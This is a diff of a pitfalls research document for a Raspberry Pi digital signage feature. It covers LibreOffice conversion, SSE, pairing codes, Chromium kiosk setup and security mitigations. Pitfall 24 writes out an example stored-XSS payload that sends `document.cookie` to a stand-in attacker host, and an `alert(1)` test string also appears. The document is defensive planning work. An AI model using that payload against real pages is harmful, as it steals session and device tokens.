+**Warning signs:** Admin reports "the URL is blank on the screen"; DevTools console on the Pi shows frame-ancestors errors.
+
+**Phase to address:** Admin UI Phase (pre-flight check) + Docs Phase (embedding requirements).
+
+---
+
+### Pitfall 24: HTML-snippet media item → stored XSS on the kiosk
+
+**What goes wrong:** Admin pastes `<script>fetch('http://attacker/x?c='+document.cookie)</script>` (or a benign-looking iframe that loads malicious JS) into an HTML snippet. The signage player renders it via `dangerouslySetInnerHTML`; the script runs in the player origin, can call `/api/signage/*` with the device token visible in JS context, exfiltrate, or pivot.
+
+**Why it happens:** "Admin-only" is an AuthN perimeter, not a scripting perimeter. A compromised admin session, or a malicious insider, trivially weaponizes HTML snippets.
+
+**How to avoid:**
+- **Sanitize server-side** with `nh3` (already in project dependencies from v1.1 logo sanitization) — same philosophy: allow a small tag/attr whitelist, strip `<script>`, `on*` handlers, `javascript:` URIs.
+- Render snippets in a **sandboxed iframe** with `sandbox="allow-scripts"` (no same-origin, no top-navigation). The snippet runs in a null origin and cannot reach the player's token.
+- Never put the device token in `localStorage` / accessible JS scope; keep it in an `HttpOnly` cookie OR inject via a separate fetch-layer that the snippet iframe cannot access.
+- Admin UI: label the HTML snippet field clearly with security implications; default to a code editor with a preview showing sanitized output.
+
+**Warning signs:** Snippet fields allow `<script>`; no iframe sandboxing; device token visible via `document.cookie` on the player.
+
+**Phase to address:** Backend Phase (sanitization) + Player Phase (sandbox iframe) + Admin UI Phase (editor + preview).
+
+---
+
+## Technical Debt Patterns
+
+| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
+|----------|-------------------|----------------|-----------------|
+| Skip conversion container isolation; run LibreOffice in `api` | One fewer service in compose | Shared event loop, RAM competition, CVE blast radius expanded to API | Never for production; OK for Phase 1 prototype only |
+| Use `subprocess.run` with `asyncio.to_thread` instead of `asyncio.subprocess` | Simpler porting of existing scripts | Thread-pool saturation, harder timeout/kill semantics | Only for sub-1s sync tools (never for LibreOffice) |
+| Store media files in Directus storage rather than backend-owned | Upload UI "free" via Directus admin | Path/UUID mismatch (Pitfall 15), harder deletes, cross-container permission issues (Pitfall 17) | Never — keep Alembic/backend as source of truth, matches v1.11 pattern |
+| Use HTTP cache + Service Worker for offline | No Pi sidecar to build | Cache eviction = black screen, HTTPS requirement on LAN | Never for kiosk offline; acceptable for admin UI offline-view |
+| Ship without SSE heartbeat / watchdog, rely on polling only | Simpler | 30-s delay on every push; worse UX; masks real SSE bugs | OK as v1.16 MVP milestone if time-boxed — fix in v1.17 |
+| Skip page-count cap on PDF uploads | Simpler upload form | Tab crashes on Pi, silent playlist breakage | Never |
+| 6-digit digits-only pairing codes | Familiar UX | Collision risk (Pitfall 13) | Only with partial-unique index + 5-min TTL + retry |
+| `--no-sandbox` on Chromium | Works as root out-of-the-box | CVE escalation path | Never for production; document non-root setup |
+
+## Integration Gotchas
+
+| Integration | Common Mistake | Correct Approach |
+|-------------|----------------|------------------|
+| Directus + Alembic (v1.11 lesson) | Let Directus create signage collections via its UI | Alembic creates tables; snapshot.yml hides them from Data Model UI |
+| APScheduler + PPTX conversion | Schedule conversion as a periodic job | Run as one-off `asyncio.create_task` on upload; semaphore-gated |
+| pdf.js + Vite | Import `pdfjs-dist` without explicit worker URL | `import workerUrl from "pdfjs-dist/build/pdf.worker.min.mjs?url"` |
+| sse-starlette + `--workers 1` | Long-running sync work inside EventSourceResponse generator | Async generator + `asyncio.Queue` broadcaster + ping interval |
+| Docker Compose + PG + Directus + migrate | Start all services in parallel | `service_completed_successfully` on migrate; api and directus both depend on it |
+| Fernet-encrypted device secrets (v1.15 pattern) | Reuse encryption key for device tokens | Device tokens are JWT (HS256, separate secret); Fernet reserved for stored credentials (SNMP community strings, Personio key) |
+| Chromium + systemd on Pi | `After=network.target` (not online) | `After=graphical.target network-online.target` + `ExecStartPre` DISPLAY gate |
+| Chromium cache + nightly reboot | Assume browser cache survives | Ship explicit file-based cache sidecar |
+
+## Performance Traps
+
+| Trap | Symptoms | Prevention | When It Breaks |
+|------|----------|------------|----------------|
+| Serving full-resolution images to 1080p screens | GPU memory pressure, fade stutters | Server-side downscale variants | 4K images on Pi 4 (immediate) |
+| Per-device DB polling inside SSE generator | API CPU climbs with device count | `asyncio.Queue` broadcast from a single change-listener | > 3 devices |
+| No concurrency cap on PPTX conversion | OOM-kill of api container | `asyncio.Semaphore(1)` + 50 MB upload cap | ≥ 2 concurrent uploads |
+| pdf.js pre-rendering neighbor pages | Canvas count × RAM grows | Single-page render + explicit cleanup | > 50-page PDF on Pi |
+| SSE without ping, nginx default timeouts | Silent stall after 60 s idle | 15-s server pings + 45-s client watchdog | Any prod deployment with reverse proxy |
+| Video loop without `preload="auto"` + dedup | Re-download on every loop iteration | Single `<video>` element, `loop` attribute, cached | Cellular fallback or slow LAN |
+
+## Security Mistakes
+
+| Mistake | Risk | Prevention |
+|---------|------|------------|
+| Device token can hit admin routes | Physically stolen Pi → admin API access | Scope claim in JWT + per-route middleware check |
+| Unsanitized HTML snippets rendered in player | Stored XSS with device-token exfiltration | `nh3` server-side + sandboxed iframe + HttpOnly cookie for token |
+| LibreOffice in main api container | PPTX CVE → DB access | Isolated `converter` container, `cap_drop: [ALL]`, no DB network |
+| Chromium as root on Pi | CVE → host compromise | Dedicated user + drop `--no-sandbox` |
+| Device tokens never rotate | Long-lived secret, stale revocation | 24-h JWT + rotate on heartbeat + `revoked_at` check |
+| Pairing code reuse across sessions | Cross-device contamination | Partial-unique-on-active index + TTL expiry |
+| Iframe to arbitrary URL in player origin | Frame-busting / clickjacking of player | `sandbox` attribute + CSP `frame-src` allowlist |
+| Media delete doesn't unlink file | Disk fills (availability), data retention violations | Transactional delete + nightly orphan GC |
+
+## UX Pitfalls
+
+| Pitfall | User Impact | Better Approach |
+|---------|-------------|-----------------|
+| Pairing code that never refreshes | Admin misses the 5-min window → support call | Auto-refresh on expiry with visual countdown on Pi |
+| No "last seen" / "offline for X min" indicator in device list | Admin assumes broken Pi is working | Heartbeat badge (green < 1 min, yellow < 5 min, red older) |
+| Video media with audio on | Jarring sound in lobby/office | Default-mute on upload; admin opts into audio explicitly |
+| No preview before assigning media to playlist | Broken content ships to all devices | Server-side thumbnail + admin-preview iframe |
+| Admin deletes media referenced in an active playlist silently | Black screen mid-loop on all devices | `ON DELETE RESTRICT` + "in use by N playlists" confirm dialog |
+| No visible "offline" state on player | Operators don't realize network dropped | Small corner chip when offline > 1 min; hidden when online |
+| PPTX conversion silent until done | Admin uploads, sees nothing, uploads again | Progress/status column in media list (pending/converting/ready/failed + retry button) |
+
+## "Looks Done But Isn't" Checklist
+
+- [ ] **PPTX conversion:** Often missing timeout + kill — verify a corrupt file fails within 60 s and does not wedge APScheduler.
+- [ ] **PDF page-flip:** Often missing worker config — verify `pdf.worker.min.mjs` loads in Network tab on a clean Pi session.
+- [ ] **SSE:** Often missing heartbeat pings — verify `: keepalive` every 15 s in `curl -N /api/signage/stream?device_token=...`.
+- [ ] **SSE client:** Often missing watchdog reconnect — verify: disable Wi-Fi on Pi for 5 min, re-enable, confirm next admin push arrives within 30 s.
+- [ ] **Chromium kiosk flags:** Often missing `--autoplay-policy=no-user-gesture-required` — verify a video with audio muted autoplays.
+- [ ] **Cursor hide:** Often incomplete — verify no cursor flicker on page transitions (`unclutter` running).
+- [ ] **Pairing code:** Often missing partial-unique DB index — verify `\d pairing_codes` shows it.
+- [ ] **Pairing race:** Often missing persistent Pi state — verify reboot mid-pair resumes polling.
+- [ ] **Device token:** Often missing scope claim — verify a device token hitting `/api/signage/admin/...` returns 403.
+- [ ] **Media delete:** Often missing file unlink — verify `du -sh /app/media` decreases after delete.
+- [ ] **Directus hide:** Often missing snapshot.yml entry for new tables — verify signage tables don't appear in Directus Data Model UI.
+- [ ] **i18n parity:** Often missing DE keys — verify CI parity script passes.
+- [ ] **Offline cache:** Often missing sidecar service — verify player keeps looping after `systemctl stop networking` on Pi.
+- [ ] **HTML snippets:** Often missing sandbox — verify `<script>alert(1)</script>` sanitized AND iframe sandbox active (two defenses).
+- [ ] **4K image:** Often missing server downscale — verify `/api/signage/media/:id/file` returns < 2 MB JPEG/WebP regardless of source.
+- [ ] **Chromium systemd:** Often missing graphical-target ordering — verify clean boot to player without black-screen race.
+
+## Recovery Strategies
+
+| Pitfall | Recovery Cost | Recovery Steps |
+|---------|---------------|----------------|
+| Conversion worker wedged | LOW | `docker compose restart api`; kill orphan `soffice` processes; mark pending rows as `failed`. |
+| OOM during upload burst | LOW | Compose auto-restart; users retry; set lower semaphore and memlimit retroactively. |
+| Zombie SSE clients after deploy | LOW | Drain connections on SIGTERM; clients auto-reconnect via watchdog. |
+| Device paired to wrong slot (code collision) | MEDIUM | Admin "Revoke device" → Pi re-enters pairing; regenerate tokens. |
+| Directus introspected signage tables as collections | MEDIUM | Restore `directus` from nightly `pg_dump`; re-apply snapshot.yml with hide entries; restart Directus. |
+| Disk full from orphan media files | MEDIUM | Run nightly-GC manually; audit `media` table vs. disk listing. |
+| Pi black screen on reboot | LOW | SSH in; `systemctl status chromium-kiosk`; fix ordering in unit file; push image update. |
+| Stored XSS in snippet reached a device | HIGH | Revoke all device tokens; audit logs for `/api/signage/*` calls from device origins; sanitize existing snippet rows in DB; patch sanitizer and sandbox. |
+| LibreOffice RCE suspected | HIGH | Take api down; rebuild converter image; scan host; rotate Directus JWT secret, Fernet key, DB password; restore from pre-incident backup. |
+
+## Pitfall-to-Phase Mapping
+
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| 1. LibreOffice hangs on corrupt PPTX | Conversion Phase | Upload corrupt PPTX → `failed` in ≤60 s |
+| 2. `subprocess.run` blocks event loop | Backend + Conversion Phase | Grep `subprocess.run` = zero hits |
+| 3. Concurrent conversions OOM | Conversion Phase | 5 concurrent uploads → serial processing, peak RAM < 1.5 GB |
+| 4. Font mismatch across environments | Conversion Phase (Dockerfile) + Docs Phase | Visual diff CI gate on reference PPTX |
+| 5. pdf.js worker missing under Vite | Player Phase | Network tab shows `pdf.worker.min.mjs` 200 |
+| 6. Large PDF OOMs Pi tab | Player Phase + Conversion Phase + Admin UI Phase | 100-page PDF → rejected or image-fallback path |
+| 7. EventSource zombie after sleep | Backend Phase + Player Phase | Wi-Fi drop 5 min → recovery < 30 s |
+| 8. SSE blocks single worker | Backend Phase | 5 SSE clients → `/api/health` p95 < 100 ms |
+| 9. Chromium `--no-sandbox` as root | Pi Provisioning + Docs Phase | `ps -u signage` shows Chromium; no `--no-sandbox` flag |
+| 10. Chromium starts before X | Pi Provisioning + Docs Phase | 10 clean reboots → kiosk up every time |
+| 11. Incomplete Chromium flag set | Pi Provisioning + Player Phase | Audio-muted video autoplays; no cursor; tab auto-recovers |
+| 12. 4K images crash GPU | Conversion Phase + Admin UI Phase | `/api/signage/media/:id/file` ≤ 2 MB |
+| 13. Pairing code collision | Schema Phase + Backend Phase | `\d pairing_codes` shows partial-unique index |
+| 14. Pairing race condition | Schema + Backend + Player Phase | Reboot Pi mid-pair → completes after reboot |
+| 15. Directus file path vs. URL | Schema Phase + Backend Phase | Backend reads all media via its own `/api/signage/media/:id/file` |
+| 16. Media delete orphans file | Backend + Schema (RESTRICT FK) + Admin UI Phase | Delete test → disk usage drops |
+| 17. Shared-volume UID mismatch | Backend Phase / Infra | Cross-container r/w touch test passes |
+| 18. Browser cache unreliable for offline | Pi Provisioning + Player Phase + Docs Phase | `systemctl stop networking` on Pi → player keeps looping |
+| 19. Alembic/Directus schema race | Schema Phase + Docs Phase | Clean `compose up` on empty DB → signage tables absent from Directus UI |
+| 20. Missing DE i18n keys | Admin UI Phase + Docs Phase | CI i18n-parity script passes |
+| 21. Device token over-scoped | Backend Phase + Admin UI + Player Phase | Device token → `/api/signage/admin/*` returns 403 |
+| 22. PPTX CVE via LibreOffice | Conversion Phase (isolation) + Docs Phase | Converter container has `cap_drop: [ALL]`, no DB net route |
+| 23. iframe blocked by X-Frame-Options | Admin UI Phase + Docs Phase | Add-URL flow warns when HEAD returns blocking headers |
+| 24. HTML-snippet XSS on kiosk | Backend + Player + Admin UI Phase | `<script>alert(1)</script>` sanitized + rendered in sandboxed iframe |
 
 ## Sources
 
-### Context7 / Official Documentation (HIGH confidence)
-- [PySNMP 7.1 Documentation — Asynchronous SNMP (v3arch)](https://docs.lextudio.com/pysnmp/v7.1/examples/hlapi/v3arch/asyncio/index.html)
-- [PySNMP 7.1 GET Operation reference](https://docs.lextudio.com/pysnmp/v7.1/docs/hlapi/v3arch/asyncio/manager/cmdgen/getcmd)
-- [PySNMP 7.1 Changelog — dispatcher resource leak fix](https://docs.lextudio.com/pysnmp/v7.1/changelog)
-- [APScheduler 3.x User Guide — misfire_grace_time, coalesce, max_instances](https://apscheduler.readthedocs.io/en/3.x/userguide.html)
-- [APScheduler 3.x FAQ — multi-worker duplicate execution](https://apscheduler.readthedocs.io/en/3.x/faq.html)
-- [PostgreSQL Wiki — Don't Do This (use timestamptz not timestamp)](https://wiki.postgresql.org/wiki/Don't_Do_This)
-- [PostgreSQL 18 Date/Time Types documentation](https://www.postgresql.org/docs/current/datatype-datetime.html)
-- [Docker Engine Networking reference](https://docs.docker.com/engine/network/)
+- **v1.11-directus PROJECT.md + MILESTONES.md** — Alembic/Directus schema ownership pattern, snapshot.yml hide mechanism, shared HS256 secret pattern.
+- **v1.15 Sensor Monitor PROJECT.md + MILESTONES.md** — `--workers 1` invariant, APScheduler `max_instances=1`, Fernet encryption pattern, DE/EN parity CI gap.
+- **FastAPI docs (tiangolo/fastapi)** — `UploadFile` streaming, `BackgroundTasks` limitations under single worker.
+- **sse-starlette README + issues** — `EventSourceResponse` ping parameter, nginx `proxy_buffering off` requirement.
+- **pdf.js upstream (mozilla/pdf.js) + Vite integration issues** — `?url` import pattern for worker, version-match requirement.
+- **Chromium command-line switches (peter.sh/experiments/chromium-command-line-switches/)** — `--autoplay-policy`, `--kiosk`, `--disable-features`.
+- **Raspberry Pi OS Bookworm + labwc session** — graphical-session ordering on Wayland.
+- **LibreOffice CVE history (libreoffice.org/about-us/security/advisories/)** — justification for conversion-container isolation.
+- **OWASP ASVS v4.0** — JWT scope claims, sandboxed iframe guidance for embedded user content.
+- **Docker Compose v2 reference** — `depends_on: condition: service_completed_successfully`, `cap_drop`, `read_only`, `security_opt: no-new-privileges`.
+- **nh3 Python binding** — same sanitizer used for v1.1 logo SVG sanitization; reused here for HTML snippets.
 
-### Verified community sources (MEDIUM confidence)
-- [pganalyze — tuning VACUUM and autovacuum](https://pganalyze.com/blog/5mins-postgres-tuning-vacuum-autovacuum)
-- [Percona — Tuning Autovacuum in PostgreSQL](https://www.percona.com/blog/tuning-autovacuum-in-postgresql-and-autovacuum-internals/)
-- [Common mistakes with APScheduler in Python/Django apps](https://sepgh.medium.com/common-mistakes-with-using-apscheduler-in-your-python-and-django-applications-100b289b812c)
-- [Efficient Asynchronous SNMP Exploration — engine reuse pattern](https://medium.com/@dheeraj.mickey/efficient-asynchronous-snmp-exploration-in-python-unleashing-the-power-of-asyncio-and-pysnmp-fa233015d61d)
+Confidence notes:
+- HIGH for: v1.11 and v1.15 in-project lessons, Chromium flags (documented publicly), Alembic/Directus ordering (verified in v1.11 deployment).
+- HIGH for: pdf.js Vite worker setup (well-documented pattern).
+- MEDIUM for: exact RAM ceilings on Pi 4 for PDF/4K (hardware-dependent; verify empirically in Player Phase).
+- MEDIUM for: specific Chromium EventSource reconnect failure modes — documented in community issues but not in Chromium release notes; watchdog pattern is the robust mitigation regardless.
 
-### Direct code inspection (HIGH confidence for reference-impl-specific pitfalls)
-- `/Users/johannbechtold/Documents/snmp-monitor/app.py` — reference implementation
-- `/Users/johannbechtold/Documents/kpi-dashboard/backend/app/scheduler.py` — existing APScheduler pattern
-- `/Users/johannbechtold/Documents/kpi-dashboard/docker-compose.yml` — container network topology
-
-### Deferred / not verified (LOW confidence, flagged)
-- Exact Postgres autovacuum behavior for pure-insert time-series workloads — recommendations are conservative; actual tuning may need field measurement after Phase 40 lands. Revisit in a post-v1.15 operational review if the readings table grows faster than projected.
+---
+*Pitfalls research for: v1.16 Digital Signage on KPI Dashboard monorepo*
+*Researched: 2026-04-18*
